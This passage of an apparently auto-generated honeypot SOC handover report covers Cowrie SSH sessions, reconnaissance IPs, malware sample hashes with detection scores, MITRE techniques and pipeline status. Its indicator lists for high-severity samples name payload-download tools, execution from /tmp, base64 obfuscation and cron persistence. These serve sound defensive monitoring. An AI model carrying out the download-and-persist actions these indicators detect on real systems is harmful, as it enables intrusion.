- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9658508d56

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:48 |
| **Last Seen** | 2026-08-08 02:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:48:13` | `cowrie.session.connect` |
| `2026-08-08 02:48:13` | `cowrie.client.version` |
| `2026-08-08 02:48:13` | `cowrie.client.kex` |
| `2026-08-08 02:48:13` | `cowrie.login.success` |
| `2026-08-08 02:48:14` | `cowrie.session.params` |
| `2026-08-08 02:48:14` | `cowrie.command.input` |
| `2026-08-08 02:48:14` | `cowrie.log.closed` |
| `2026-08-08 02:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-280833427518

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:50 |
| **Last Seen** | 2026-08-08 02:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:50:00` | `cowrie.session.connect` |
| `2026-08-08 02:50:00` | `cowrie.client.version` |
| `2026-08-08 02:50:00` | `cowrie.client.kex` |
| `2026-08-08 02:50:00` | `cowrie.login.success` |
| `2026-08-08 02:50:01` | `cowrie.session.params` |
| `2026-08-08 02:50:01` | `cowrie.command.input` |
| `2026-08-08 02:50:01` | `cowrie.log.closed` |
| `2026-08-08 02:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241ace3468fe

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:51 |
| **Last Seen** | 2026-08-08 02:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:51:43` | `cowrie.session.connect` |
| `2026-08-08 02:51:43` | `cowrie.client.version` |
| `2026-08-08 02:51:43` | `cowrie.client.kex` |
| `2026-08-08 02:51:43` | `cowrie.login.success` |
| `2026-08-08 02:51:44` | `cowrie.session.params` |
| `2026-08-08 02:51:44` | `cowrie.command.input` |
| `2026-08-08 02:51:44` | `cowrie.log.closed` |
| `2026-08-08 02:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b030088966

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:53 |
| **Last Seen** | 2026-08-08 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:53:21` | `cowrie.session.connect` |
| `2026-08-08 02:53:22` | `cowrie.client.version` |
| `2026-08-08 02:53:22` | `cowrie.client.kex` |
| `2026-08-08 02:53:22` | `cowrie.login.success` |
| `2026-08-08 02:53:23` | `cowrie.session.params` |
| `2026-08-08 02:53:23` | `cowrie.command.input` |
| `2026-08-08 02:53:23` | `cowrie.log.closed` |
| `2026-08-08 02:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **19** | 2026-08-08 00:55 | 2026-08-08 02:48 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `101.201.104[.]216` | **7** | 2026-08-08 02:27 | 2026-08-08 02:47 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **6** | 2026-08-08 01:02 | 2026-08-08 02:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-08-08 02:39 | 2026-08-08 02:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **6** | 2026-08-08 01:19 | 2026-08-08 02:13 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-08 01:04 | 2026-08-08 02:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-08 02:00 | 2026-08-08 02:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.89.124[.]208` | **2** | 2026-08-08 01:11 | 2026-08-08 01:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-08-08 02:33 | 2026-08-08 02:34 | 47s | 0 | `T1592` | 🟢 LOW |
| `104.2.88[.]64` | 1 | 2026-08-08 02:20 | 2026-08-08 02:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.48.160[.]201` | 1 | 2026-08-08 02:33 | 2026-08-08 02:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.108.88[.]121` | 1 | 2026-08-08 02:00 | 2026-08-08 02:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.111.201[.]58` | 1 | 2026-08-08 01:11 | 2026-08-08 01:12 | 12s | 0 | `T1592` | 🟢 LOW |
| `115.190.166[.]122` | 1 | 2026-08-08 02:26 | 2026-08-08 02:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.241.228[.]34` | 1 | 2026-08-08 01:59 | 2026-08-08 01:59 | 3s | 0 | `T1592` | 🟢 LOW |
| `117.72.56[.]31` | 1 | 2026-08-08 01:13 | 2026-08-08 01:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-08 01:32 | 2026-08-08 01:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-08 02:33 | 2026-08-08 02:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.227.245[.]63` | 1 | 2026-08-08 02:33 | 2026-08-08 02:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `180.248.60[.]108` | 1 | 2026-08-08 00:59 | 2026-08-08 00:59 | 8s | 0 | `T1592` | 🟢 LOW |
| `181.79.90[.]77` | 1 | 2026-08-08 02:50 | 2026-08-08 02:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.121.108[.]166` | 1 | 2026-08-08 02:22 | 2026-08-08 02:22 | 14s | 0 | `T1592` | 🟢 LOW |
| `186.71.124[.]7` | 1 | 2026-08-08 01:01 | 2026-08-08 01:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.89.255[.]9` | 1 | 2026-08-08 01:54 | 2026-08-08 01:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]235` | 1 | 2026-08-08 01:04 | 2026-08-08 01:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]254` | 1 | 2026-08-08 02:36 | 2026-08-08 02:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]248` | 1 | 2026-08-08 01:05 | 2026-08-08 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.88.203[.]46` | 1 | 2026-08-08 01:20 | 2026-08-08 01:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `31.173.8[.]170` | 1 | 2026-08-08 02:00 | 2026-08-08 02:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-08-08 01:29 | 2026-08-08 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-08 01:35 | 2026-08-08 01:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-08 02:40 | 2026-08-08 02:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.231.227[.]244` | 1 | 2026-08-08 02:48 | 2026-08-08 02:48 | 11s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]192` | 1 | 2026-08-08 02:34 | 2026-08-08 02:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]48` | 1 | 2026-08-08 02:47 | 2026-08-08 02:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.129.165[.]39` | 1 | 2026-08-08 01:17 | 2026-08-08 01:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]177` | 1 | 2026-08-08 02:36 | 2026-08-08 02:36 | 9s | 0 | `T1592` | 🟢 LOW |
| `93.185.182[.]229` | 1 | 2026-08-08 01:24 | 2026-08-08 01:24 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.178.222[.]55` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `14.54.22[.]11` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `49.124.148[.]192` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 22 |
| `93.185.182[.]229` | RU | JSC TKT | **100** ⚠️ | 0 |
| `41.178.230[.]115` | EG | Link Egypt | **100** ⚠️ | 7 |
| `65.20.134[.]97` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `189.89.255[.]9` | BR | VILANET TELECOMUNICAÇÕES LTDA | **100** ⚠️ | 3 |
| `207.219.222[.]29` | CA | TELUS Communications Inc. | **100** ⚠️ | 44 |
| `104.2.88[.]64` | US | AT&T Enterprises, LLC | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 190 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 304 cases |
| Tool 34  | Credential Extractor        | ✅ 208 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 96 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 72 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 190 priority case(s) shown individually · 38 recon entry/entries in table (8 group(s) consolidating 54 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T03:38:08Z_
